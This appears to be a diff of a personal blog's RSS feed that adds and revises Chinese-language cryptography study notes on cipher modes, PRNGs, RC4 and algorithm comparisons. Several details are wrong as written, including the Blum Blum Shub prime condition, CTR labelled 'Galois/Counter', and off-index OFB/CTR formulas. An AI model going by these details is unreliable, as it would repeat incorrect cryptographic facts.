@@ -15,8 +15,75 @@
     <atom:link href="https://hejueyun.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description></description>
-    <pubDate>Thu, 20 Jan 2022 14:52:34 GMT</pubDate>
+    <pubDate>Thu, 20 Jan 2022 17:18:38 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>密码学备忘录-工作模式</title>
+      <link>https://hejueyun.github.io/posts/c82bbc9e/</link>
+      <guid>https://hejueyun.github.io/posts/c82bbc9e/</guid>
+      <pubDate>Thu, 20 Jan 2022 16:28:13 GMT</pubDate>
+      
+      <description>&lt;h2 id=&quot;工作模式Modes-of-Operation&quot;&gt;&lt;a href=&quot;#工作模式Modes-of-Operation&quot; class=&quot;headerlink&quot; title=&quot;工作模式Modes of Operation&quot;&gt;&lt;/a&gt;工作模式Modes of Operation&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;解决如何将cipher加密算法运用到plaintext明文的问题&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;有block分组和stream流两种方式&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;img loading=&quot;lazy&quot; src=&quot;/posts/c82bbc9e/2020-08-10-19-02-24.png&quot; width height=&quot;200&quot;&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;ECB，CBC，OFB，CFB，CTR和XTS模式仅仅提供了&lt;strong&gt;机密性&lt;/strong&gt;；为了保证加密信息没有被意外修改或恶意篡改，需要采用分离的消息验证码，例如CBC-&lt;strong&gt;MAC&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;ECB-Electronic-codebook&quot;&gt;&lt;a href=&quot;#ECB-Electronic-codebook&quot; class=&quot;headerlink&quot; title=&quot;ECB Electronic codebook&quot;&gt;&lt;/a&gt;ECB Electronic codebook&lt;/h3&gt;&lt;img loading=&quot;lazy&quot; src=&quot;/posts/c82bbc9e/2020-08-10-19-05-10.png&quot; width height=&quot;200&quot;&gt;
+
+&lt;ul&gt;
+&lt;li&gt;当明文分组重复时，密文也重复，易实现统计分析攻击&lt;/li&gt;
+&lt;li&gt;结构化数据，将产生大量重复的密文&lt;/li&gt;
+&lt;li&gt;ECB模式最严重的问题是使得对手选取部分分组进行重放攻击&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&quot;CBC-Cipher-block-chaining&quot;&gt;&lt;a href=&quot;#CBC-Cipher-block-chaining&quot; class=&quot;headerlink&quot; title=&quot;CBC Cipher-block chaining&quot;&gt;&lt;/a&gt;CBC Cipher-block chaining&lt;/h3&gt;&lt;img loading=&quot;lazy&quot; src=&quot;/posts/c82bbc9e/2020-08-10-19-06-24.png&quot; width height=&quot;200&quot;&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;保护IV的原因&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;如果敌手能欺骗接收方使用不同的Iv值，敌手就能够在明文的第1个分组中插入自己选择的比特值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;错误传播&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;明文错误传播&lt;ul&gt;
+&lt;li&gt;加密前的明文中某个错误对解密后恢复的明文的影响&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CBC没有明文错误传播&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;密文错误传播&lt;ul&gt;
+&lt;li&gt;密文组中某部分比特错误&lt;/li&gt;
+&lt;li&gt;某密文组丢失&lt;/li&gt;
+&lt;li&gt;被插入一个密文组&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CBC的密文错误传播很小&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;padding oracle attack&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="工作模式Modes-of-Operation"><a href="#工作模式Modes-of-Operation" class="headerlink" title="工作模式Modes of Operation"></a>工作模式Modes of Operation</h2><ul><li><strong>解决如何将cipher加密算法运用到plaintext明文的问题</strong></li><li><strong>有block分组和stream流两种方式</strong></li></ul><img loading="lazy" src="/posts/c82bbc9e/2020-08-10-19-02-24.png" width height="200"><blockquote><p>ECB，CBC，OFB，CFB，CTR和XTS模式仅仅提供了<strong>机密性</strong>；为了保证加密信息没有被意外修改或恶意篡改，需要采用分离的消息验证码，例如CBC-<strong>MAC</strong></p></blockquote><h3 id="ECB-Electronic-codebook"><a href="#ECB-Electronic-codebook" class="headerlink" title="ECB Electronic codebook"></a>ECB Electronic codebook</h3><img loading="lazy" src="/posts/c82bbc9e/2020-08-10-19-05-10.png" width height="200"><ul><li>当明文分组重复时，密文也重复，易实现统计分析攻击</li><li>结构化数据，将产生大量重复的密文</li><li>ECB模式最严重的问题是使得对手选取部分分组进行重放攻击</li></ul><h3 id="CBC-Cipher-block-chaining"><a href="#CBC-Cipher-block-chaining" class="headerlink" title="CBC Cipher-block chaining"></a>CBC Cipher-block chaining</h3><img loading="lazy" src="/posts/c82bbc9e/2020-08-10-19-06-24.png" width height="200"><ul><li><p>保护IV的原因</p><ul><li>如果敌手能欺骗接收方使用不同的Iv值，敌手就能够在明文的第1个分组中插入自己选择的比特值</li></ul></li><li><p><strong>错误传播</strong></p><ul><li>明文错误传播<ul><li>加密前的明文中某个错误对解密后恢复的明文的影响</li><li><strong>CBC没有明文错误传播</strong></li></ul></li><li>密文错误传播<ul><li>密文组中某部分比特错误</li><li>某密文组丢失</li><li>被插入一个密文组</li><li><strong>CBC的密文错误传播很小</strong></li></ul></li></ul></li><li><p>padding oracle attack</p></li></ul><h4 id="CBC-MAC"><a href="#CBC-MAC" class="headerlink" title="CBC-MAC"></a>CBC-MAC</h4><blockquote><p> a technique for constructing a message authentication code from a block cipher. </p></blockquote><ul><li>CBC-MAC 仅适用于对相同长度的消息进行认证，在消息长度变化的情况下是不安全的</li><li>当取AES作为MAC加密的分组密码时，一般采用CBC模式，所以通常称为基于AES的CBC-MAC,若需要产生认证码的消息为x，加密的AES为k，则生成加解密的过程如下图所示</li></ul><img loading="lazy" src="/posts/c82bbc9e/3.jpg" width="500"><h3 id="CFB-密码反馈-Cipher-Feed-Back"><a href="#CFB-密码反馈-Cipher-Feed-Back" class="headerlink" title="CFB(密码反馈)Cipher Feed Back"></a>CFB(密码反馈)Cipher Feed Back</h3><ul><li>将分组密码作为流密码的密钥流发生器<ul><li>利用CFB(Cipher Feed Back)模式或输出反馈(OFB)模式，可将<strong>分组密码</strong>转换为<strong>流密码</strong></li></ul></li></ul><img loading="lazy" src="/posts/c82bbc9e/2020-08-10-19-18-52.png" width height="250"><img loading="lazy" src="/posts/c82bbc9e/2020-08-11-15-19-31.png" width height="250"><p>攻击</p><img loading="lazy" src="/posts/c82bbc9e/2020-08-11-15-08-16.png" width height="200"><h3 id="OFB-输出反馈-Output-feedback"><a href="#OFB-输出反馈-Output-feedback" class="headerlink" title="OFB(输出反馈) Output feedback"></a>OFB(输出反馈) Output feedback</h3><ul><li>OFB模式是将加密算法的输出反馈到移位寄存器</li><li>CFB模式中是将密文单元反馈到移位寄存器</li></ul><img loading="lazy" src="/posts/c82bbc9e/2020-08-11-15-12-27.png" width height="200"><ul><li>优点:传输过程中的密文比特错误不会被传播</li><li>缺点:它比CFB模式更易受到对消息流的篡改攻击</li></ul><img loading="lazy" src="/posts/c82bbc9e/2020-08-11-15-06-33.png" width height="200"><h3 id="CTR-Counter"><a href="#CTR-Counter" class="headerlink" title="CTR Counter"></a>CTR Counter</h3><blockquote><p>与OFB一样，计数器模式将一个块状密码变成了一个流密码。它通过对一个 “计数器 “的连续值进行加密来生成下一个密钥流块。计数器可以是任何能产生一个保证长时间不重复的序列的函数</p></blockquote><img loading="lazy" src="/posts/c82bbc9e/5.svg" width="500"><h3 id="XTS"><a href="#XTS" class="headerlink" title="XTS"></a>XTS</h3><img loading="lazy" src="/posts/c82bbc9e/2.svg" width="500"><ul><li>XEX-based tweaked-codebook mode with ciphertext stealing</li><li>基于XEX的调整密码本模式与密码文本窃取</li></ul><p>弱点</p><blockquote><p>XTS模式容易受到数据操纵和篡改的影响，如果操纵和篡改是一个问题，应用程序必须采用措施来检测数据的修改：”……由于没有认证标签，那么任何密码文本（原始或被攻击者修改）将被解密为一些明文，没有内置机制来检测修改。可以做的最好的事情是确保对密码文本的任何更改将完全随机化明文，并依靠使用这种转换的应用程序在其明文中包括足够的冗余，以检测和丢弃这种随机明文。” 这就需要为磁盘上的所有数据和元数据维护校验和，正如ZFS或Btrfs所做的那样。然而，在常用的文件系统中，如ext4和NTFS，只有元数据受到保护，不被篡改，而对数据篡改的检测是不存在的[16] 。</p><p>该模式容易受到流量分析、重放和对扇区和16字节块的随机化攻击。当一个给定的扇区被重写时，攻击者可以收集细粒度（16字节）的密码文本，这可用于分析或重放攻击（以16字节为粒度）。定义扇区范围内的块密码是可能的，不幸的是性能会下降（见下文）。</p></blockquote>]]></content:encoded>
+      
+      
+      <category domain="https://hejueyun.github.io/categories/Security/">Security</category>
+      
+      <category domain="https://hejueyun.github.io/categories/Security/Cryptography/">Cryptography</category>
+      
+      
+      <category domain="https://hejueyun.github.io/tags/Note/">Note</category>
+      
+      
+      <comments>https://hejueyun.github.io/posts/c82bbc9e/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>密码学备忘录-消息验证码MAC</title>
@@ -163,7 +230,7 @@
 &lt;li&gt;deterministic algorithm&lt;/li&gt;
 &lt;li&gt;seed&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&quot;种类&quot;&gt;&lt;a href=&quot;#种类&quot; class=&quot;headerlink&quot; title=&quot;种类&quot;&gt;&lt;/a&gt;种类&lt;/h3&gt;&lt;h4 id=&quot;Linear-Congruential-Generator-线性同余生成器&quot;&gt;&lt;a href=&quot;#Linear-Congruential-Generator-线性同余生成器&quot; class=&quot;headerlink&quot; title=&quot;Linear Congruential Generator 线性同余生成器&quot;&gt;&lt;/a&gt;Linear Congruential Generator 线性同余生成器&lt;/h4&gt;&lt;ul&gt;
+&lt;h3 id=&quot;种类&quot;&gt;&lt;a href=&quot;#种类&quot; class=&quot;headerlink&quot; title=&quot;种类&quot;&gt;&lt;/a&gt;种类&lt;/h3&gt;&lt;h4 id=&quot;1-Linear-Congruential-Generator-线性同余生成器&quot;&gt;&lt;a href=&quot;#1-Linear-Congruential-Generator-线性同余生成器&quot; class=&quot;headerlink&quot; title=&quot;1. Linear Congruential Generator 线性同余生成器&quot;&gt;&lt;/a&gt;1. Linear Congruential Generator 线性同余生成器&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;$x_{n+1}=(aX_n+c)\bmod{m}$&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;特点&lt;/p&gt;
@@ -174,7 +241,7 @@
       
       
       
-      <content:encoded><![CDATA[<h2 id="pseudorandom-number-generation"><a href="#pseudorandom-number-generation" class="headerlink" title="pseudorandom number generation"></a>pseudorandom number generation</h2><h3 id="随机数的作用"><a href="#随机数的作用" class="headerlink" title="随机数的作用"></a>随机数的作用</h3><ul><li>防止重放攻击</li><li>keystream for a one-time pad（一次性密码的密钥流）</li><li>public key generation 生成公钥</li></ul><h3 id="伪随机数和随机数区别"><a href="#伪随机数和随机数区别" class="headerlink" title="伪随机数和随机数区别"></a>伪随机数和随机数区别</h3><ul><li>deterministic algorithm</li><li>seed</li></ul><h3 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h3><h4 id="Linear-Congruential-Generator-线性同余生成器"><a href="#Linear-Congruential-Generator-线性同余生成器" class="headerlink" title="Linear Congruential Generator 线性同余生成器"></a>Linear Congruential Generator 线性同余生成器</h4><ul><li>$x_{n+1}=(aX_n+c)\bmod{m}$</li></ul><p>特点</p><ul><li>存在周期</li><li>32bit计算</li></ul><h4 id="Blum-Blum-Shub-B-B-S-算法"><a href="#Blum-Blum-Shub-B-B-S-算法" class="headerlink" title="Blum Blum Shub (B.B.S.) 算法"></a>Blum Blum Shub (B.B.S.) 算法</h4><ul><li>$x_0=seed^2\bmod{n}$</li><li>$LOOP x_i == x_{i-i}^2\bmod{n}$</li><li>$b_i=x_i\bmod{2}$<ul><li>p,q is prime</li><li>p,q mod 3 == 4</li></ul></li></ul><p>特点</p><ul><li>based on public key algorithms</li><li>安全性基于分解n的困难性(同rsa)</li></ul><h4 id="Using-Block-Ciphers-as-PRNG-运用分组（对称）加密算法作为生成器"><a href="#Using-Block-Ciphers-as-PRNG-运用分组（对称）加密算法作为生成器" class="headerlink" title="Using Block Ciphers as PRNG 运用分组（对称）加密算法作为生成器"></a>Using Block Ciphers as PRNG 运用分组（对称）加密算法作为生成器</h4><ul><li>CRT</li><li>OFB</li><li>CBC-MAC</li></ul><p><strong>e.g. ANSI X9.17 PRGN</strong></p><ul><li>date and time(DTi)</li><li>uses 2-key (K1,K2) triple DES</li><li>feeds back between rounds (Vi)</li></ul><img loading="lazy" src="/posts/f6b1e424/1.png" width="500"><h4 id="运用非对称加密算法作为生成器"><a href="#运用非对称加密算法作为生成器" class="headerlink" title="运用非对称加密算法作为生成器"></a>运用非对称加密算法作为生成器</h4><ul><li>总体上慢，因此只应用于生成短伪随机数</li><li>PRNG based on RSA</li></ul><img loading="lazy" src="/posts/f6b1e424/5.png" width="500"><ul><li>PRNG based on ECC</li></ul><h2 id="Stream-Ciphers"><a href="#Stream-Ciphers" class="headerlink" title="Stream Ciphers"></a>Stream Ciphers</h2><ul><li>是一种对称加密算法<ul><li>加密和解密双方使用相同伪随机加密数据流（pseudo-random stream）作为密钥</li></ul></li><li>该算法解决了对称加密完善保密性（<strong>perfect secrecy</strong>）的实际操作困难<ul><li>具有该性质的密文不应该透露任何明文的信息</li><li><strong>完善保密性要求密钥长度不短于明文长度</strong>，故而实际操作存在困难，改由较短数据流通过特定算法得到密钥流</li></ul></li></ul><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>一种严重的错误即反复使用同一密码本对不同明文进行加密。攻击者可利用这种方式对密文进行解密。用p表示明文，C表示密文，k表示种子，PRG表示密钥流生成算法，则：</p><ul><li>C1 = p1 xor PRG (k)</li><li>C2 = p2 xor PRG (k)<br>攻击者监听到此段消息（包含两段相同密钥流加密的密文）后，即可利用：</li><li>C1 xor C2得到p1 xor p2<br>足量的冗余（此处表示p1，p2）则可破解明文。 </li></ul><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><img loading="lazy" src="/posts/f6b1e424/2.jpg" width="550"><ul><li><p><a href="https://www.cnblogs.com/gambler/p/9075415.html">RC4加密算法原理简单理解 - 沉默的赌徒 - 博客园</a></p></li><li><p>RC4 key schedule</p></li></ul><img loading="lazy" src="/posts/f6b1e424/3.png" width="450"><ul><li>RC4 Encryption</li></ul><img loading="lazy" src="/posts/f6b1e424/4.png" width="450"><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>result is very non–linear</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul><li>these days, RC4 is known to be biased (unequal numbers of 0s and 1s in the keystream)</li><li>永远不应该重复使用密码本</li></ul><h2 id="true-random-numbers"><a href="#true-random-numbers" class="headerlink" title="true random numbers"></a>true random numbers</h2><ul><li>best source is natural randomness in real world 最好的来源是现实世界中的自然随机性</li></ul>]]></content:encoded>
+      <content:encoded><![CDATA[<h2 id="pseudorandom-number-generation"><a href="#pseudorandom-number-generation" class="headerlink" title="pseudorandom number generation"></a>pseudorandom number generation</h2><h3 id="随机数的作用"><a href="#随机数的作用" class="headerlink" title="随机数的作用"></a>随机数的作用</h3><ul><li>防止重放攻击</li><li>keystream for a one-time pad（一次性密码的密钥流）</li><li>public key generation 生成公钥</li></ul><h3 id="伪随机数和随机数区别"><a href="#伪随机数和随机数区别" class="headerlink" title="伪随机数和随机数区别"></a>伪随机数和随机数区别</h3><ul><li>deterministic algorithm</li><li>seed</li></ul><h3 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h3><h4 id="1-Linear-Congruential-Generator-线性同余生成器"><a href="#1-Linear-Congruential-Generator-线性同余生成器" class="headerlink" title="1. Linear Congruential Generator 线性同余生成器"></a>1. Linear Congruential Generator 线性同余生成器</h4><ul><li>$x_{n+1}=(aX_n+c)\bmod{m}$</li></ul><p>特点</p><ul><li>存在周期</li><li>32bit计算</li></ul><h4 id="2-Blum-Blum-Shub-B-B-S-算法"><a href="#2-Blum-Blum-Shub-B-B-S-算法" class="headerlink" title="2. Blum Blum Shub (B.B.S.) 算法"></a>2. Blum Blum Shub (B.B.S.) 算法</h4><ul><li>$x_0=seed^2\bmod{n}$</li><li>$LOOP x_i == x_{i-i}^2\bmod{n}$</li><li>$b_i=x_i\bmod{2}$<ul><li>p,q is prime</li><li>p,q mod 3 == 4</li></ul></li></ul><p>特点</p><ul><li>based on public key algorithms</li><li>安全性基于分解n的困难性(同rsa)</li></ul><h4 id="3-Using-Block-Ciphers-as-PRNG-运用分组（对称）加密算法作为生成器"><a href="#3-Using-Block-Ciphers-as-PRNG-运用分组（对称）加密算法作为生成器" class="headerlink" title="3. Using Block Ciphers as PRNG 运用分组（对称）加密算法作为生成器"></a>3. Using Block Ciphers as PRNG 运用分组（对称）加密算法作为生成器</h4><ul><li>CRT</li><li>OFB</li><li>CBC-MAC</li></ul><p><strong>e.g. ANSI X9.17 PRGN</strong></p><ul><li>date and time(DTi)</li><li>uses 2-key (K1,K2) triple DES</li><li>feeds back between rounds (Vi)</li></ul><img loading="lazy" src="/posts/f6b1e424/1.png" width="500"><h4 id="4-运用非对称加密算法作为生成器"><a href="#4-运用非对称加密算法作为生成器" class="headerlink" title="4. 运用非对称加密算法作为生成器"></a>4. 运用非对称加密算法作为生成器</h4><ul><li>总体上慢，因此只应用于生成短伪随机数</li><li>PRNG based on RSA</li></ul><img loading="lazy" src="/posts/f6b1e424/5.png" width="500"><ul><li>PRNG based on ECC</li></ul><h2 id="Stream-Ciphers"><a href="#Stream-Ciphers" class="headerlink" title="Stream Ciphers"></a>Stream Ciphers</h2><ul><li>是一种对称加密算法<ul><li>加密和解密双方使用相同伪随机加密数据流（pseudo-random stream）作为密钥</li></ul></li><li>该算法解决了对称加密完善保密性（<strong>perfect secrecy</strong>）的实际操作困难<ul><li>具有该性质的密文不应该透露任何明文的信息</li><li><strong>完善保密性要求密钥长度不短于明文长度</strong>，故而实际操作存在困难，改由较短数据流通过特定算法得到密钥流</li></ul></li></ul><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>一种严重的错误即反复使用同一密码本对不同明文进行加密。攻击者可利用这种方式对密文进行解密。用p表示明文，C表示密文，k表示种子，PRG表示密钥流生成算法，则：</p><ul><li>C1 = p1 xor PRG (k)</li><li>C2 = p2 xor PRG (k)<br>攻击者监听到此段消息（包含两段相同密钥流加密的密文）后，即可利用：</li><li>C1 xor C2得到p1 xor p2<br>足量的冗余（此处表示p1，p2）则可破解明文。 </li></ul><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><img loading="lazy" src="/posts/f6b1e424/2.jpg" width="550"><ul><li>Key-scheduling algorithm (KSA)<ul><li>临时向量 T</li><li>状态向量 S</li><li>密钥 K</li></ul></li></ul><img loading="lazy" src="/posts/f6b1e424/3.png" width="450"><ul><li>RC4 Encryption </li></ul><img loading="lazy" src="/posts/f6b1e424/4.png" width="450"><ul><li>注意直到最后一步$C_i$都只是在生成伪随机序列(<strong>密钥流</strong>)<ul><li>S的每个元素每256次迭代至少与另一个元素互换一次</li><li>PRGA(Pseudo-random generation algorithm)</li></ul></li><li>最后一步异或才算是C=M+K</li></ul><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul><li>result is very non-linear</li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ul><li>these days, RC4 is known to be biased (unequal numbers of 0s and 1s in the keystream)</li><li>永远不应该重复使用密码本</li></ul><h2 id="true-random-numbers"><a href="#true-random-numbers" class="headerlink" title="true random numbers"></a>true random numbers</h2><ul><li>best source is natural randomness in real world 最好的来源是现实世界中的自然随机性</li></ul>]]></content:encoded>
       
       
       <category domain="https://hejueyun.github.io/categories/Security/">Security</category>
@@ -195,7 +262,7 @@
       <guid>https://hejueyun.github.io/posts/8b9f706b/</guid>
       <pubDate>Wed, 12 Jan 2022 19:00:15 GMT</pubDate>
       
-      <description>&lt;h3 id=&quot;mode-of-operation&quot;&gt;&lt;a href=&quot;#mode-of-operation&quot; class=&quot;headerlink&quot; title=&quot;mode of operation&quot;&gt;&lt;/a&gt;mode of operation&lt;/h3&gt;&lt;table&gt;
+      <description>&lt;h2 id=&quot;mode-of-operation&quot;&gt;&lt;a href=&quot;#mode-of-operation&quot; class=&quot;headerlink&quot; title=&quot;mode of operation&quot;&gt;&lt;/a&gt;mode of operation&lt;/h2&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;&lt;/th&gt;
@@ -218,7 +285,7 @@
 &lt;td&gt;CBC&lt;/td&gt;
 &lt;td&gt;Cipher block chaining&lt;/td&gt;
 &lt;td&gt;密文分组链接&lt;/td&gt;
-&lt;td&gt;$C_i=E_k(M_i \bigoplus{C_{i-1}})$ $C_0=IV$&lt;/td&gt;
+&lt;td&gt;$C_i=E_k(M_i \bigoplus{C_{i-1}})$&lt;br&gt; $C_0=IV$&lt;/td&gt;
 &lt;td&gt;CBC没有明文错误传播，密文错误传播小&lt;/td&gt;
 &lt;td&gt;需要初始化和保护IV（原因），前面的分组会对后面的产生影响&lt;/td&gt;
 &lt;/tr&gt;
@@ -226,7 +293,7 @@
 &lt;td&gt;CFB&lt;/td&gt;
 &lt;td&gt;Ciphertex feedback&lt;/td&gt;
 &lt;td&gt;密文反馈&lt;/td&gt;
-&lt;td&gt;$C_i=M_i \bigoplus{E_k(C_{i-1}})$ $C_0=IV$&lt;/td&gt;
+&lt;td&gt;$C_i=M_i \bigoplus{E_k(C_{i-1}})$&lt;br&gt; $C_0=IV$&lt;/td&gt;
 &lt;td&gt;可作为随机数生成器&lt;/td&gt;
 &lt;td&gt;在错误发生后，错误会在几个区块内传播（但不是无限期地传播）。&lt;/td&gt;
 &lt;/tr&gt;
@@ -234,7 +301,7 @@
 &lt;td&gt;OFB&lt;/td&gt;
 &lt;td&gt;Output feedback&lt;/td&gt;
 &lt;td&gt;输出反馈&lt;/td&gt;
-&lt;td&gt;$O_i=E_k(O_{i-1})$ $C_i=M_i\bigoplus O_{i-1}$ $O_0=IV$&lt;/td&gt;
+&lt;td&gt;$O_i=E_k(O_{i-1})$&lt;br&gt; $C_i=M_i\bigoplus O_{i-1}$&lt;br&gt; $O_0=IV$&lt;/td&gt;
 &lt;td&gt;可作为随机数生成器，密文1bit错误只会导致对应的1bit出错&lt;/td&gt;
 &lt;td&gt;接收者和发送者必须保持同步&lt;/td&gt;
 &lt;/tr&gt;
@@ -242,7 +309,7 @@
 &lt;td&gt;CTR&lt;/td&gt;
 &lt;td&gt;Galois/Counter&lt;/td&gt;
 &lt;td&gt;计数器&lt;/td&gt;
-&lt;td&gt;$O_i=E_k(i)$ $C_i=M_i\bigoplus O_{i-1}$&lt;/td&gt;
+&lt;td&gt;$O_i=E_k(i)$&lt;br&gt; $C_i=M_i\bigoplus O_{i-1}$&lt;/td&gt;
 &lt;td&gt;速度快&lt;/td&gt;
 &lt;td&gt;对每一分组必须用不同的$K$和计数$i$&lt;/td&gt;
 &lt;/tr&gt;
@@ -250,12 +317,12 @@
 &lt;td&gt;AES-XTS&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
-&lt;td&gt;$T$ is tweak, $H$ is a hash function $C=H(T)\bigoplus{E(K,H(T)\bigoplus{M})}$&lt;/td&gt;
+&lt;td&gt;$T$ is tweak, $H$ is a hash function&lt;br&gt; $C=H(T)\bigoplus{E(K,H(T)\bigoplus{M})}$&lt;/td&gt;
 &lt;td&gt;高效&lt;/td&gt;
 &lt;td&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;&lt;/table&gt;
-&lt;h3 id=&quot;symmetric-algorithm&quot;&gt;&lt;a href=&quot;#symmetric-algorithm&quot; class=&quot;headerlink&quot; title=&quot;symmetric algorithm&quot;&gt;&lt;/a&gt;symmetric algorithm&lt;/h3&gt;&lt;table&gt;
+&lt;h2 id=&quot;Symmetric-Algorithm&quot;&gt;&lt;a href=&quot;#Symmetric-Algorithm&quot; class=&quot;headerlink&quot; title=&quot;Symmetric Algorithm&quot;&gt;&lt;/a&gt;Symmetric Algorithm&lt;/h2&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;&lt;/th&gt;
@@ -274,23 +341,23 @@
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Principle&lt;/td&gt;
-&lt;td&gt;DES work on &lt;strong&gt;Feistel&lt;/strong&gt; Cipher structure.&lt;/td&gt;
+&lt;td&gt;DES work on &lt;strong&gt;Feistel&lt;/strong&gt; Cipher structure.&lt;/td&gt;
 &lt;td&gt;AES works on &lt;strong&gt;Substitution and Permutation&lt;/strong&gt; Principle.&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
 &lt;td&gt;PRNG&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Plaintext&lt;/td&gt;
-&lt;td&gt;明文按64位进行分组&lt;/td&gt;
-&lt;td&gt;Plaintext can be of 128,192, or 256 bits&lt;/td&gt;
+&lt;td&gt;明文按64位进行分组，以&lt;strong&gt;比特&lt;/strong&gt;为单位&lt;/td&gt;
+&lt;td&gt;Plaintext can be of 128,192, or 256，以&lt;strong&gt;字节&lt;/strong&gt;为单位 bits&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
-&lt;td&gt;以每一个字节为单位&lt;/td&gt;
+&lt;td&gt;以&lt;strong&gt;字节&lt;/strong&gt;为单位&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Key size&lt;/td&gt;
 &lt;td&gt;密钥长64位，有效密钥长度56（第8、16、24、32、40、48、56、64位是校验位， 使得每个密钥都有奇数个1&lt;/td&gt;
 &lt;td&gt;密钥长度则可以是128，192或256比特&lt;/td&gt;
-&lt;td&gt;3个独立密钥的3DES（密钥选项1）的有效密钥长度为&lt;strong&gt;168&lt;/strong&gt;位（56x3），但由于中途相遇攻击，它的有效安全性仅为112位&lt;/td&gt;
+&lt;td&gt;EEE的有效密钥长度为&lt;strong&gt;168&lt;/strong&gt;位（56x3），但由于中途相遇攻击，它的有效安全性仅为112位&lt;/td&gt;
 &lt;td&gt;40–2048 bits&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
@@ -309,10 +376,10 @@
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Security&lt;/td&gt;
-&lt;td&gt;DES has a smaller key which is less secure.&lt;/td&gt;
-&lt;td&gt;AES has large secret key comparatively hence, more secure.&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;1.&lt;/code&gt;&lt;/strong&gt; S盒提供了DES的核心安全性—如果没有S盒，密码会是线性的，很容易破解 &lt;strong&gt;&lt;code&gt;2.&lt;/code&gt;&lt;/strong&gt; S盒，P置换和E扩张各自满足了混淆扩散原则 &lt;code&gt;3.&lt;/code&gt; Avalanche Effect &lt;code&gt;4.&lt;/code&gt; Timing Attacks &amp;amp;&amp;amp; Cryptanalysis&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;1.&lt;/code&gt; SubBytes提供了非线性代换保证安全性&lt;/td&gt;
 &lt;td&gt;-&lt;/td&gt;
-&lt;td&gt;-&lt;/td&gt;
+&lt;td&gt;RC4安全性主要取决于于初始密钥的保密性&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Speed&lt;/td&gt;
@@ -322,11 +389,84 @@
 &lt;td&gt;7 cycles per byte on original Pentium&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;&lt;/table&gt;
-&lt;h3 id=&quot;assymetric-algorithm&quot;&gt;&lt;a href=&quot;#assymetric-algorithm&quot; class=&quot;headerlink&quot; title=&quot;assymetric algorithm&quot;&gt;&lt;/a&gt;assymetric algorithm&lt;/h3&gt;&lt;h3 id=&quot;hash-funtion&quot;&gt;&lt;a href=&quot;#hash-funtion&quot; class=&quot;headerlink&quot; title=&quot;hash funtion&quot;&gt;&lt;/a&gt;hash funtion&lt;/h3&gt;&lt;h3 id=&quot;digital-signature&quot;&gt;&lt;a href=&quot;#digital-signature&quot; class=&quot;headerlink&quot; title=&quot;digital signature&quot;&gt;&lt;/a&gt;digital signature&lt;/h3&gt;&lt;h3 id=&quot;key-distribution&quot;&gt;&lt;a href=&quot;#key-distribution&quot; class=&quot;headerlink&quot; title=&quot;key distribution&quot;&gt;&lt;/a&gt;key distribution&lt;/h3&gt;&lt;h3 id=&quot;math&quot;&gt;&lt;a href=&quot;#math&quot; class=&quot;headerlink&quot; title=&quot;math&quot;&gt;&lt;/a&gt;math&lt;/h3&gt;</description>
